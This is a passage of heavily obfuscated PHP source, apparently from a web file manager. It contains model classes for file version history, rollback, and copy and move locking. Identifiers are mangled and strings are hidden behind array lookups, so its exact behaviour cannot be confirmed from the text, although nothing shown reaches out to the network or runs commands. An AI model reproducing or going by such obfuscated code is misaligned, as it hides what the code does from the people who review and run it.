$øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[1202]] = $ò…òš“[$øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[1202]]]; } if ($øâ„Òİñ[$¥•†ùš[33]] == $¥•†ùš[2126] && isset($øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[183]])) { $øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[183]] = $ò…òš“[$øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[183]]]; } $øâ„Òİñ[$¥•†ùš[89]] = $ò…òš“[$øâ„Òİñ[$¥•†ùš[183]]]; $øâ„Òİñ[$¥•†ùš[2131]] = $ò…òš“[$øâ„Òİñ[$¥•†ùš[2116]]]; if ($øâ„Òİñ[$¥•†ùš[33]] == $¥•†ùš[1857]) { $øâ„Òİñ[$¥•†ùš[2131]] = $øâ„Òİñ[$¥•†ùš[89]]; $øâ„Òİñ[$¥•†ùš[2116]] = $øâ„Òİñ[$¥•†ùš[2131]][$¥•†ùš[183]]; $øâ„Òİñ[$¥•†ùš[89]] = !1; $øâ„Òİñ[$¥•†ùš[183]] = $¥•†ùš[12]; } $øâ„Òİñ[$¥•†ùš[2060]] = $û²ª¶§[$øâ„Òİñ[$¥•†ùš[1690]]]; } unset($øâ„Òİñ); $Õœşàí§[$¥•†ùš[424]] = $Ä¿„åÁ˜; return $Õœşàí§; } public function removeBySource($ıéÏ¥×) { $í™œ²Ù® = array($_SERVER[ •ŒÓîÆ][470] => $ıéÏ¥×); $this->where($í™œ²Ù®)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\143\x65\137\x68\151\x73\164\x6f\x72\x79"; public function historyCount($‰ÅƒäÈ…) { $ÏÃşŞÌ¿ =& $_SERVER[ •ŒÓîÆ]; if (!$‰ÅƒäÈ…) { return array(); } if (is_string($‰ÅƒäÈ…) || is_int($‰ÅƒäÈ…)) { $‰ÅƒäÈ… = array($‰ÅƒäÈ…); } $æö¢—î£ = array($ÏÃşŞÌ¿[183], $ÏÃşŞÌ¿[1921] => $ÏÃşŞÌ¿[545]); $÷ìØ›Æ = array($ÏÃşŞÌ¿[183] => array($ÏÃşŞÌ¿[7], $‰ÅƒäÈ…)); $îßŞƒë¿ = $this->field($æö¢—î£)->where($÷ìØ›Æ)->group($ÏÃşŞÌ¿[183])->select(); return array_to_keyvalue($îßŞƒë¿, $ÏÃşŞÌ¿[183], $ÏÃşŞÌ¿[545]); } public function addHistory($è÷É÷õå, $·õÉÇµ = '') { $·Öæ ›¾ =& $_SERVER[ •ŒÓîÆ]; $üˆãÑÍ = array($·Öæ ›¾[470] => $è÷É÷õå[$·Öæ ›¾[183]], $·Öæ ›¾[1681] => isset($è÷É÷õå[$·Öæ ›¾[508]]) ? $è÷É÷õå[$·Öæ ›¾[508]] : $è÷É÷õå[$·Öæ ›¾[506]], $·Öæ ›¾[521] => $è÷É÷õå[$·Öæ ›¾[520]], $·Öæ ›¾[597] => $è÷É÷õå[$·Öæ ›¾[78]], $·Öæ ›¾[2132] => $·õÉÇµ); if ($GLOBALS[$·Öæ ›¾[6]][$·Öæ ›¾[91]][$·Öæ ›¾[1258]] >= 1) { $this->historyAutoClear($üˆãÑÍ[$·Öæ ›¾[183]]); $this->add($üˆãÑÍ); } Hook::trigger($·Öæ ›¾[2133], $üˆãÑÍ); Model($·Öæ ›¾[2134])->eventFileEdit($è÷É÷õå[$·Öæ ›¾[183]]); } private function historyAutoClear($÷Ùıüˆ§) { $ì¨¸µª¿ =& $_SERVER[ •ŒÓîÆ]; $‡“Ä²á› = Model($ì¨¸µª¿[811])->get($ì¨¸µª¿[1280]); $±«ÄÊ‚¬ = intval($GLOBALS[$ì¨¸µª¿[6]][$ì¨¸µª¿[91]][$ì¨¸µª¿[1258]]); $µ¥ûÄÙÇ = $‡“Ä²á› == $ì¨¸µª¿[1281] ? min(5, $±«ÄÊ‚¬) : $±«ÄÊ‚¬; $µ¥ûÄÙÇ = $µ¥ûÄÙÇ <= 0 ? 0 : $µ¥ûÄÙÇ - 1; if ($µ¥ûÄÙÇ >= 500) { return; } $–£¨¢ÎÖ = array($ì¨¸µª¿[470] => $÷Ùıüˆ§); $Š¬€Çã = $this->field($ì¨¸µª¿[2135])->where($–£¨¢ÎÖ)->order($ì¨¸µª¿[2129])->select(); if (!$Š¬€Çã || $µ¥ûÄÙÇ >= count($Š¬€Çã)) { return; } $ç­¤öü§ = array_to_keyvalue($Š¬€Çã, $ì¨¸µª¿[12], $ì¨¸µª¿[453]); $ç­¤öü§ = array_slice($ç­¤öü§, $µ¥ûÄÙÇ); $±ÆˆØ¸Œ = array_to_keyvalue($Š¬€Çã, $ì¨¸µª¿[12], $ì¨¸µª¿[520]); $±ÆˆØ¸Œ = array_slice($±ÆˆØ¸Œ, $µ¥ûÄÙÇ); if (!$ç­¤öü§ || !$±ÆˆØ¸Œ) { return; } $–£¨¢ÎÖ = array($ì¨¸µª¿[472] => array($ì¨¸µª¿[7], $ç­¤öü§)); $this->where($–£¨¢ÎÖ)->delete(); Model($ì¨¸µª¿[523])->remove($±ÆˆØ¸Œ); } public function listData($Ú×‚ÜÈÙ) { $âšÉâ© =& $_SERVER[ •ŒÓîÆ]; $óñ’Ğ¤ = array($âšÉâ©[470] => $Ú×‚ÜÈÙ); $ŠÙÓƒĞş = $âšÉâ©[2136]; $ƒ¦‹¬‡õ = $this->field($ŠÙÓƒĞş)->where($óñ’Ğ¤)->order($âšÉâ©[2129])->selectPage(); $this->_listAppendUser($ƒ¦‹¬‡õ[$âšÉâ©[424]]); $Ó¦•ŠÅ‡ = Model($âšÉâ©[811])->get($âšÉâ©[1280]); $Ï•éı÷ù = 5; if ($Ó¦•ŠÅ‡ == $âšÉâ©[1281]) { $ƒ¦‹¬‡õ[$âšÉâ©[424]] = array_slice($ƒ¦‹¬‡õ[$âšÉâ©[424]], 0, $Ï•éı÷ù); $ƒ¦‹¬‡õ[$âšÉâ©[421]] = array($âšÉâ©[2137] => 1, $âšÉâ©[2138] => 20, $âšÉâ©[2139] => 1, $âšÉâ©[2140] => count($ƒ¦‹¬‡õ[$âšÉâ©[424]])); } return $ƒ¦‹¬‡õ; } protected function _listAppendUser(&$ïÅÓö´ê) { $öÂ£°Í¤ =& $_SERVER[ •ŒÓîÆ]; $£˜—ì‹‰ = array_to_keyvalue($ïÅÓö´ê, $öÂ£°Í¤[12], $öÂ£°Í¤[1690]); $µ¢£ãåö = Model($öÂ£°Í¤[579])->userListInfo($£˜—ì‹‰); foreach ($ïÅÓö´ê as &$¸¢Ï…í€) { $Ú¸²Á‰ = $¸¢Ï…í€[$öÂ£°Í¤[1690]]; $¸¢Ï…í€[$öÂ£°Í¤[506]] = $µ¢£ãåö[$Ú¸²Á‰] ? $µ¢£ãåö[$Ú¸²Á‰] : !1; } unset($¸¢Ï…í€); } public function fileInfo($™áíø¸ò) { $——â½Ö =& $_SERVER[ •ŒÓîÆ]; $˜¤í®‘£ = $this->tablePrefix; $‡Œê¸¹” = "{$˜¤í®‘£}\x69\x6f\x5f\146\151\154\x65\x20\146\151\x6c\x65\163\40\157\156\x20\x66\151\154\x65\163\x2e\x66\x69\154\x65\111\104\x20\75\40\x68\x69\x73\164\x6f\162\171\x2e\146\x69\154\x65\x49\x44"; return $this->alias($——â½Ö[2141])->where(array($——â½Ö[472] => $™áíø¸ò))->join($‡Œê¸¹”, $——â½Ö[2142])->find(); } public function removeItem($å†Ùñë) { $Šü®æô =& $_SERVER[ •ŒÓîÆ]; $µô×¿¿“ = array($Šü®æô[472] => $å†Ùñë); $àüõ€²ó = $this->where($µô×¿¿“)->find(); if ($àüõ€²ó) { $ÍêÂ•‡ = $this->where($µô×¿¿“)->delete(); Model($Šü®æô[523])->remove($àüõ€²ó[$Šü®æô[520]]); return $ÍêÂ•‡; } return !1; } public function removeBySource($ì›³öçÚ) { $‰Ï‚‚ç† =& $_SERVER[ •ŒÓîÆ]; if (!$ì›³öçÚ) { return !1; } if (!is_array($ì›³öçÚ)) { $ì›³öçÚ = array($ì›³öçÚ); } $ÄçÔ³ = array($‰Ï‚‚ç†[470] => array($‰Ï‚‚ç†[7], $ì›³öçÚ)); $¯»‡ĞùÑ = $this->field($‰Ï‚‚ç†[521])->where($ÄçÔ³)->select(); if ($¯»‡ĞùÑ) { $this->where($ÄçÔ³)->delete(); $‘ÌÈı¬” = array_to_keyvalue($¯»‡ĞùÑ, $‰Ï‚‚ç†[12], $‰Ï‚‚ç†[520]); Model($‰Ï‚‚ç†[523])->remove($‘ÌÈı¬”); } return !0; } public function setDetail($–—ÀÄ¸, $—ß –º) { $ºæ¥ÖıŠ =& $_SERVER[ •ŒÓîÆ]; return $this->where(array($ºæ¥ÖıŠ[472] => $–—ÀÄ¸))->save(array($ºæ¥ÖıŠ[2132] => $—ß –º)); } public function rollbackToItem($¬±Û‚Ÿ…, $‰£¯¶¨œ) { $ğÅÄ´÷ =& $_SERVER[ •ŒÓîÆ]; $ –ŞÃÆ€ = Model($ğÅÄ´÷[866])->sourceInfo($¬±Û‚Ÿ…); $this->addHistory($ –ŞÃÆ€, LNG($ğÅÄ´÷[2143])); $Á÷Œúåè = $this->find($‰£¯¶¨œ); $Üî“ÊÉæ = array($ğÅÄ´÷[520] => $Á÷Œúåè[$ğÅÄ´÷[520]], $ğÅÄ´÷[78] => $Á÷Œúåè[$ğÅÄ´÷[78]], $ğÅÄ´÷[87] => time(), $ğÅÄ´÷[508] => USER_ID); Model($ğÅÄ´÷[866])->where(array($ğÅÄ´÷[183] => $¬±Û‚Ÿ…))->save($Üî“ÊÉæ); return $this->where(array($ğÅÄ´÷[472] => $‰£¯¶¨œ))->delete(); } public function clearSame($¶ù¸÷¶Ï) { $…üÍ³Á† =& $_SERVER[ •ŒÓîÆ]; $ÙèÉóÉ = $this->listData($¶ù¸÷¶Ï); $ÃÃÍ×è¾ = array_to_keyvalue_group($ÙèÉóÉ, $…üÍ³Á†[520]); $ˆ±Ñ¹Ë = array(); $¢èÎúï¿ = array(); foreach ($ÃÃÍ×è¾ as $“òÉè§ñ) { if (!$“òÉè§ñ || count($“òÉè§ñ) <= 1) { continue; } foreach ($“òÉè§ñ as $—–ª„†®) { $ˆ±Ñ¹Ë[] = $—–ª„†®[$…üÍ³Á†[520]]; $¢èÎúï¿[] = $—–ª„†®[$…üÍ³Á†[453]]; } } if (!$¢èÎúï¿) { return; } $this->where(array($…üÍ³Á†[453] => array($…üÍ³Á†[7], $¢èÎúï¿)))->delete(); Model($…üÍ³Á†[523])->remove($ˆ±Ñ¹Ë); } public function userSpace() { $»ß‘§œ‹ =& $_SERVER[ •ŒÓîÆ]; $ŠŸ®ß¼Ğ = $this->tablePrefix; $½òƒÃ€ù = array($»ß‘§œ‹[1681] => USER_ID); $ÈğĞâ­ = "{$ŠŸ®ß¼Ğ}\151\x6f\137\146\x69\x6c\x65\x20\146\151\154\145\163\40\157\156\40\146\151\154\x65\163\x2e\146\x69\154\145\111\104\x20\x3d\40\x68\x69\163\164\x6f\x72\171\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($»ß‘§œ‹[2141])->where($½òƒÃ€ù)->join($ÈğĞâ­, $»ß‘§œ‹[2142])->sum($»ß‘§œ‹[78]); } } goto E¦ä²Å¸…³; A”Ø¾ö¡œ×: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($˜è•Ô´Ğ) { $ÒğšÌè =& $_SERVER[ •ŒÓîÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÒğšÌè[598], $˜è•Ô´Ğ); $ÅÖ¶¤ = 1; $this->_lockEvent($˜è•Ô´Ğ, array($ÒğšÌè[599], $ÒğšÌè[600]), $ÅÖ¶¤); $this->_lockParent($˜è•Ô´Ğ, array($ÒğšÌè[600]), $ÅÖ¶¤); $this->_lockEvent($˜è•Ô´Ğ, array($ÒğšÌè[601], $ÒğšÌè[602]), $ÅÖ¶¤); $this->_lockCheckEnd($ÒğšÌè[598], $˜è•Ô´Ğ); } public function lockCopyEnd($àÕ„ºÆ‘) { $úÌŒ¼×Ö =& $_SERVER[ •ŒÓîÆ]; if (!$this->allowLock()) { return; } $Šœè‚İÛ = 0; $this->_lockEvent($àÕ„ºÆ‘, array($úÌŒ¼×Ö[599], $úÌŒ¼×Ö[600]), $Šœè‚İÛ); $this->_lockParent($àÕ„ºÆ‘, array($úÌŒ¼×Ö[600]), $Šœè‚İÛ); $this->_lockEvent($àÕ„ºÆ‘, array($úÌŒ¼×Ö[601], $úÌŒ¼×Ö[602]), $Šœè‚İÛ); } public function lockWriteStart($×üìøÏÊ, $Ñ¥ı¦ˆ« = '') { $áÏÕÂ¡ =& $_SERVER[ •ŒÓîÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($áÏÕÂ¡[599], $×üìøÏÊ); $ëâŠŸÙ‹ = 1; $this->_lockKey($áÏÕÂ¡[603] . $×üìøÏÊ . $áÏÕÂ¡[10] . $Ñ¥ı¦ˆ«, $ëâŠŸÙ‹); $this->_lockEvent($×üìøÏÊ, array($áÏÕÂ¡[598], $áÏÕÂ¡[600]), $ëâŠŸÙ‹); $this->_lockParent($×üìøÏÊ, array($áÏÕÂ¡[598], $áÏÕÂ¡[600]), $ëâŠŸÙ‹); $this->_lockCheckEnd($áÏÕÂ¡[599], $×üìøÏÊ); } public function lockWriteEnd($…İÑ©´Ø, $Ğì¦Çßß = '') { $½¥ÎĞ‡€ =& $_SERVER[ •ŒÓîÆ]; if (!$this->allowLock()) { return; } $ÅŒ®±í = 0; $this->_lockKey($½¥ÎĞ‡€[603] . $…İÑ©´Ø . $½¥ÎĞ‡€[10] . $Ğì¦Çßß, $ÅŒ®±í); $this->_lockEvent($…İÑ©´Ø, array($½¥ÎĞ‡€[598], $½¥ÎĞ‡€[600]), $ÅŒ®±í); $this->_lockParent($…İÑ©´Ø, array($½¥ÎĞ‡€[598], $½¥ÎĞ‡€[600]), $ÅŒ®±í); } public function lockMoveStart($”·”ô£‹) { $¸òÕ“û‰ =& $_SERVER[ •ŒÓîÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸òÕ“û‰[600], $”·”ô£‹); $âÑ¼Úß = 1; $this->_lockKey($¸òÕ“û‰[604] . $”·”ô£‹, $âÑ¼Úß); $this->_lockEvent($”·”ô£‹, array($¸òÕ“û‰[598], $¸òÕ“û‰[599]), $âÑ¼Úß); $this->_lockParent($”·”ô£‹, array($¸òÕ“û‰[598], $¸òÕ“û‰[600]), $âÑ¼Úß); $this->_lockEvent($”·”ô£‹, array($¸òÕ“û‰[605], $¸òÕ“û‰[601], $¸òÕ“û‰[602]), $âÑ¼Úß); $this->_lockCheckEnd($¸òÕ“û‰[600], $”·”ô£‹); } public function lockMoveEnd($œÃšò½) { $Õæíê·ì =& $_SERVER[ •ŒÓîÆ]; if (!$this->allowLock()) { return; } $óÛÓÛóù = 0; $this->_lockKey($Õæíê·ì[604] . $œÃšò½, $óÛÓÛóù); $this->_lockEvent($œÃšò½, array($Õæíê·ì[598], $Õæíê·ì[599]), $óÛÓÛóù); $this->_lockParent($œÃšò½, array($Õæíê·ì[598], $Õæíê·ì[600]), $óÛÓÛóù); $this->_lockEvent($œÃšò½, array($Õæíê·ì[605], $Õæíê·ì[601], $Õæíê·ì[602]), $óÛÓÛóù); } private function _lockCheck($ÌúÀ…Íò, $ÓêÜÑõ©) { $ìò³Êğ¾ =& $_SERVER[ •ŒÓîÆ]; $åÀ¿°‚ = $this->sourceInfo($ÓêÜÑõ©); $ÕŸ™£È± = $ÌúÀ…Íò . $ìò³Êğ¾[10] . $ÓêÜÑõ©; $this->_lockTimeStart[$ÕŸ™£È±] = timeFloat(); if (!is_array($åÀ¿°‚)) { return; } $ ‡˜º· = LNG($ìò³Êğ¾[606]); CacheLock::setErrorMsg($ìò³Êğ¾[165] . htmlspecialchars($åÀ¿°‚[$ìò³Êğ¾[32]]) . $ìò³Êğ¾[167] . $ ‡˜º·); $this->_lockKey($ÕŸ™£È±, 1); $this->_lockKey($ÕŸ™£È±, 0); $ÊíÑİâÌ = array_reverse($this->parentLevelArray($åÀ¿°‚[$ìò³Êğ¾[565]])); foreach ($ÊíÑİâÌ as $­È™ƒõ) { $ÕŸ™£È± = $ÌúÀ…Íò . $ìò³Êğ¾[607] . $­È™ƒõ; if (CacheLock::lockGet($ìò³Êğ¾[608] . $ÕŸ™£È±)) { $åÀ¿°‚ = $this->sourceInfo($­È™ƒõ); CacheLock::setErrorMsg($ìò³Êğ¾[165] . htmlspecialchars($åÀ¿°‚[$ìò³Êğ¾[32]]) . $ìò³Êğ¾[167] . $ ‡˜º·); $this->_lockKey($ÕŸ™£È±, 1); $this->_lockKey($ÕŸ™£È±, 0); } } } private function _lockCheckEnd($œğÑßÚØ, $ÍöàØ§Æ) { $·«æ©â¸ =& $_SERVER[ •ŒÓîÆ]; $‹•é˜’Š = $œğÑßÚØ . $·«æ©â¸[10] . $ÍöàØ§Æ; CacheLock::setErrorMsg($·«æ©â¸[263]); if (!isset($this->_lockTimeStart[$‹•é˜’Š])) { return; } $¸ÎõæÉÇ = timeFloat() - $this->_lockTimeStart[$‹•é˜’Š]; unset($this->_lockTimeStart[$‹•é˜’Š]); if ($¸ÎõæÉÇ > 0.5) { unset(self::$cacheSourceInfo[$·«æ©â¸[512] . $ÍöàØ§Æ]); } $½ëõ™ÌÃ = $this->sourceInfo($ÍöàØ§Æ); if (!$½ëõ™ÌÃ) { show_json(LNG($·«æ©â¸[107]), !1); } } private function _lockParent($¤»–´Œ±, $™¦ĞâÊì, $†„²›ï£) { if (!$this->autoLockSet) { return; } $ôÒÓ±å = $this->sourceInfo($¤»–´Œ±); if (!is_array($ôÒÓ±å)) { return; } $àõÑ‰Ù¥ = array_reverse($this->parentLevelArray($ôÒÓ±å[$_SERVER[ •ŒÓîÆ][565]])); foreach ($àõÑ‰Ù¥ as $ìõâ“Ğ‰) { $this->_lockEvent($ìõâ“Ğ‰, $™¦ĞâÊì, $†„²›ï£); } } private function _lockEvent($ùÂÓŞãŠ, $›ÊÏİ˜á, $å’Á´) { $°£òêù„ =& $_SERVER[ •ŒÓîÆ]; if (!$this->autoLockSet) { return; } foreach ($›ÊÏİ˜á as $º¾œô×µ) { $³´û¹èÃ = $º¾œô×µ . $°£òêù„[10] . $ùÂÓŞãŠ; if ($å’Á´ && CacheLock::lockGet($°£òêù„[608] . $³´û¹èÃ)) { continue; } $this->_lockKey($³´û¹èÃ, $å’Á´); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Û¢€şÍ, $€âäóÊ» = 1) { $¹øºä = $_SERVER[ •ŒÓîÆ][608] . md5($Û¢€şÍ); if ($€âäóÊ») { if (isset(self::$_lockItemArr[$¹øºä])) { return; } self::$_lockItemArr[$¹øºä] = 1; CacheLock::lock($¹øºä, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¹øºä])) { return; } unset(self::$_lockItemArr[$¹øºä]); CacheLock::unlock($¹øºä); } } public function isParentOf($Ó“ŸÔß, $×³•™’“) { $ÚŒÖã¾â =& $_SERVER[ •ŒÓîÆ]; $»á˜áõ± = $this->sourceInfo($Ó“ŸÔß); $¹ªŞ£–¼ = $this->sourceInfo($×³•™’“); $¶¡Íø×ñ = $»á˜áõ±[$ÚŒÖã¾â[565]] . $»á˜áõ±[$ÚŒÖã¾â[183]] . $ÚŒÖã¾â[50]; $š†¥¬´õ = $¹ªŞ£–¼[$ÚŒÖã¾â[565]] . $¹ªŞ£–¼[$ÚŒÖã¾â[183]] . $ÚŒÖã¾â[50]; $µ€…ÛÏ = strpos($š†¥¬´õ, $¶¡Íø×ñ) === 0; return $µ€…ÛÏ; } private $targetIsDelete = 0; public function copy($¿ªéõè», $çĞœŠÚĞ, $æ‚‚¶Ö = REPEAT_REPLACE, $˜ó¯æ·à = '') { $Øï¤óÉô =& $_SERVER[ •ŒÓîÆ]; $µÊº•Ñ§ = $this->sourceInfo($¿ªéõè»); $óöóœóò = $this->sourceInfo($çĞœŠÚĞ); if (!$µÊº•Ñ§ || !$óöóœóò || $óöóœóò[$Øï¤óÉô[464]] != $Øï¤óÉô[90]) { return !1; } if ($this->isParentOf($¿ªéõè», $çĞœŠÚĞ)) { return !1; } $îÇ“ğ¾­ = $˜ó¯æ·à ? $˜ó¯æ·à : $µÊº•Ñ§[$Øï¤óÉô[32]]; $this->lockCopyStart($¿ªéõè»); $this->lockWriteStart($çĞœŠÚĞ, $îÇ“ğ¾­); $Î·é¾Ë = array($Øï¤óÉô[609] => array(), $Øï¤óÉô[610] => array(), $Øï¤óÉô[611] => array()); $this->targetIsDelete = intval($µÊº•Ñ§[$Øï¤óÉô[484]]); $„ÆÒÄê¹ = $this->fileNameExistAuto($çĞœŠÚĞ, $µÊº•Ñ§); $™ß ¨“Í = $this->_copy($¿ªéõè», $çĞœŠÚĞ, $æ‚‚¶Ö, $Î·é¾Ë, !0, $˜ó¯æ·à); $this->_childrenListClear(); $this->lockCopyEnd($¿ªéõè»); $this->lockWriteEnd($çĞœŠÚĞ, $îÇ“ğ¾­); if ($µÊº•Ñ§[$Øï¤óÉô[464]] == $Øï¤óÉô[90] && $„ÆÒÄê¹ == $™ß ¨“Í) { $this->folderSizeResetChildren($„ÆÒÄê¹); } Model($Øï¤óÉô[612])->addAll($Î·é¾Ë[$Øï¤óÉô[610]], array(), !0); if ($„ÆÒÄê¹ != $™ß ¨“Í || $µÊº•Ñ§[$Øï¤óÉô[464]] == $Øï¤óÉô[90]) { Model($Øï¤óÉô[613])->eventCopy($™ß ¨“Í); } $this->saveAll($Î·é¾Ë[$Øï¤óÉô[611]]); Model($Øï¤óÉô[216])->linkAdd($Î·é¾Ë[$Øï¤óÉô[609]]); $this->folderSizeReset($çĞœŠÚĞ); $this->updateModifyTime($çĞœŠÚĞ); return $™ß ¨“Í; } private function _copy($ÃÅ¥Ü‚ä, $Õ‰ˆ¹¤Ã, $‹£ö€İí, &$§•¡Ü¥, $òğŞæ’°, $œ—ºÀëä = '') { $±Ü­¨ßê =& $_SERVER[ •ŒÓîÆ]; $¬¬Äæˆ½ = $this->sourceInfoCache($ÃÅ¥Ü‚ä); $£Î¯ûöˆ = $¬¬Äæˆ½[$±Ü­¨ßê[464]] == $±Ü­¨ßê[90]; $¹ÓÛáÑğ = $œ—ºÀëä ? $œ—ºÀëä : $¬¬Äæˆ½[$±Ü­¨ßê[32]]; $†‹¹É…Ñ = $this->fileNameExistAuto($Õ‰ˆ¹¤Ã, $¬¬Äæˆ½); if ($òğŞæ’°) { $this->_childrenAllMake($ÃÅ¥Ü‚ä); if ($£Î¯ûöˆ && $†‹¹É…Ñ) { $this->_childrenAllMake($†‹¹É…Ñ); } } if (!$†‹¹É…Ñ) { return $this->_copyCreate($ÃÅ¥Ü‚ä, $Õ‰ˆ¹¤Ã, $¹ÓÛáÑğ, $§•¡Ü¥); } $‘º¯Ú½‘ = $†‹¹É…Ñ; if ($£Î¯ûöˆ) { if ($‹£ö€İí == REPEAT_RENAME_FOLDER) { $¹ÓÛáÑğ = $this->fileNameAutoCache($Õ‰ˆ¹¤Ã, $¹ÓÛáÑğ, $‹£ö€İí, $£Î¯ûöˆ); $‘º¯Ú½‘ = $this->_copyCreate($ÃÅ¥Ü‚ä, $Õ‰ˆ¹¤Ã, $¹ÓÛáÑğ, $§•¡Ü¥); } else { $é™™Ïª = $this->_childrenList($ÃÅ¥Ü‚ä); foreach ($é™™Ïª as $Ã”À‹Ò²) { $this->_copy($Ã”À‹Ò²[$±Ü­¨ßê[183]], $†‹¹É…Ñ, $‹£ö€İí, $§•¡Ü¥, !1); } } } else { if ($‹£ö€İí == REPEAT_RENAME || $‹£ö€İí == REPEAT_RENAME_FOLDER) { $¹ÓÛáÑğ = $this->fileNameAutoCache($Õ‰ˆ¹¤Ã, $¹ÓÛáÑğ, $‹£ö€İí, $£Î¯ûöˆ); $‘º¯Ú½‘ = $this->_copyCreate($ÃÅ¥Ü‚ä, $Õ‰ˆ¹¤Ã, $¹ÓÛáÑğ, $§•¡Ü¥); } else { if ($‹£ö€İí == REPEAT_REPLACE) { $´ìÔñ¯” = $this->sourceInfoCache($†‹¹É…Ñ); $ óÖóÜó = $this->fileHistory($´ìÔñ¯”, $¬¬Äæˆ½[$±Ü­¨ßê[520]], $¬¬Äæˆ½[$±Ü­¨ßê[78]]); if ($ óÖóÜó) { $§•¡Ü¥[$±Ü­¨ßê[609]][] = $¬¬Äæˆ½[$±Ü­¨ßê[520]]; } } else { if ($‹£ö€İí == REPEAT_SKIP) { } } } Hook::trigger($±Ü­¨ßê[614], array($±Ü­¨ßê[615], $¬¬Äæˆ½, 0)); } return $‘º¯Ú½‘; } private function _copyCreate($¸êšúà, $á¼îæ¶, $Áãˆ‹², &$»ö§ÑÜ—) { $ãªòÊÒ© =& $_SERVER[ •ŒÓîÆ]; $ø¬ÖÛ£¯ = $this->sourceInfoCache($¸êšúà); $Ùù«ò§ı = $this->sourceInfoCache($á¼îæ¶); $á‘É×Î = $this->_makeItemData($ø¬ÖÛ£¯, $Ùù«ò§ı, $Áãˆ‹²); Hook::trigger($ãªòÊÒ©[616], $á‘É×Î); Hook::trigger($ãªòÊÒ©[617], array($ãªòÊÒ©[618], $á‘É×Î, 0)); $óÊ˜ÓŠÚ = $this->add($á‘É×Î); $Ïó¬œèâ = array($ãªòÊÒ©[183] => $óÊ˜ÓŠÚ, $ãªòÊÒ©[32] => $Áãˆ‹²); $this->_copyApplyMeta($Ïó¬œèâ, $»ö§ÑÜ—); if ($ø¬ÖÛ£¯[$ãªòÊÒ©[464]] != $ãªòÊÒ©[90]) { $»ö§ÑÜ—[$ãªòÊÒ©[609]][] = $ø¬ÖÛ£¯[$ãªòÊÒ©[520]]; return $óÊ˜ÓŠÚ; } $«çÊ¹‚Ì = array(); $‰¼¶ç˜³ = array(); $this->_childrenListAll($¸êšúà, $«çÊ¹‚Ì); $Ù›Ø¡™ = count($«çÊ¹‚Ì); if ($Ù›Ø¡™ == 0) { return $óÊ˜ÓŠÚ; } $·¼„«Ä‘ = $this->sourceInfo($óÊ˜ÓŠÚ); foreach ($«çÊ¹‚Ì as $  ©ß£) { $òÈ³ÓÖ = $this->_makeItemData($  ©ß£, $·¼„«Ä‘, $  ©ß£[$ãªòÊÒ©[32]]); $òÈ³ÓÖ[$ãªòÊÒ©[565]] = $  ©ß£[$ãªòÊÒ©[565]]; $‰¼¶ç˜³[] = $òÈ³ÓÖ; } $this->chunkEventSet($ãªòÊÒ©[619], array($ãªòÊÒ©[620], $á‘É×Î, $Ù›Ø¡™)); $this->addAll($‰¼¶ç˜³, array(), !1); $Ç¬«œ = $this->where(array($ãªòÊÒ©[182] => $óÊ˜ÓŠÚ))->select(); $¨¯„‡ğ = $this->_childrenMakeRelation($«çÊ¹‚Ì, $Ç¬«œ); $¨¯„‡ğ[$¸êšúà] = $óÊ˜ÓŠÚ; $ó®èÀ²³ = array(); $êñìñå— = array(); foreach ($Ç¬«œ as $  ©ß£) { $È•Úµ = $  ©ß£[$ãªòÊÒ©[183]]; $¼Åİ­ì† = $this->_childrenMatch($¨¯„‡ğ, $  ©ß£, $·¼„«Ä‘); $ó®èÀ²³[] = array($ãªòÊÒ©[183], $È•Úµ, $ãªòÊÒ©[182], $¼Åİ­ì†[$ãªòÊÒ©[182]]); $êñìñå—[] = array($ãªòÊÒ©[183], $È•Úµ, $ãªòÊÒ©[565], $¼Åİ­ì†[$ãªòÊÒ©[565]]); $this->_copyApplyMeta($  ©ß£, $»ö§ÑÜ—); if ($  ©ß£[$ãªòÊÒ©[464]] != $ãªòÊÒ©[90]) { $»ö§ÑÜ—[$ãªòÊÒ©[609]][] = $  ©ß£[$ãªòÊÒ©[520]]; } } $this->chunkEventSet($ãªòÊÒ©[621], array($ãªòÊÒ©[622], $á‘É×Î, $Ù›Ø¡™)); $this->saveAll($ó®èÀ²³); $this->chunkEventSet($ãªòÊÒ©[623], array($ãªòÊÒ©[624], $á‘É×Î, $Ù›Ø¡™)); $this->saveAll($êñìñå—); return $óÊ˜ÓŠÚ; } private function _childrenMakeRelation($„Ï œ°ß, $®”—ì) { $È£®â =& $_SERVER[ •ŒÓîÆ]; $¬«…çÉš = array(); $ò„İÁß = array(); foreach ($„Ï œ°ß as $»¸£—•) { $²…ú‰é¾ = $»¸£—•[$È£®â[32]] . $È£®â[8] . $»¸£—•[$È£®â[565]]; $¬«…çÉš[$²…ú‰é¾] = $»¸£—•[$È£®â[183]]; } foreach ($®”—ì as $»¸£—•) { $²…ú‰é¾ = $»¸£—•[$È£®â[32]] . $È£®â[8] . $»¸£—•[$È£®â[565]]; $ìèïÇä = $¬«…çÉš[$²…ú‰é¾]; $ò„İÁß[$ìèïÇä] = $»¸£—•[$È£®â[183]]; } return $ò„İÁß; } private function _childrenMatch($Ë­Æœ§, $¬…ÒäğÇ, $¶ïà’íÒ) { $àôÈÆÚá =& $_SERVER[ •ŒÓîÆ]; $Î¿¬òˆˆ = $¶ïà’íÒ[$àôÈÆÚá[565]]; $«É³ê‹º = $this->parentLevelArray($¬…ÒäğÇ[$àôÈÆÚá[565]]); foreach ($«É³ê‹º as $şÓå÷°Å) { if (isset($Ë­Æœ§[$şÓå÷°Å])) { $Î¿¬òˆˆ .= $Ë­Æœ§[$şÓå÷°Å] . $àôÈÆÚá[625]; } } $Î¿¬òˆˆ = rtrim($Î¿¬òˆˆ, $àôÈÆÚá[50]) . $àôÈÆÚá[50]; $›åÔ¶ØÎ = $this->parentLevelArray($Î¿¬òˆˆ); $ıæÓ”ËĞ = 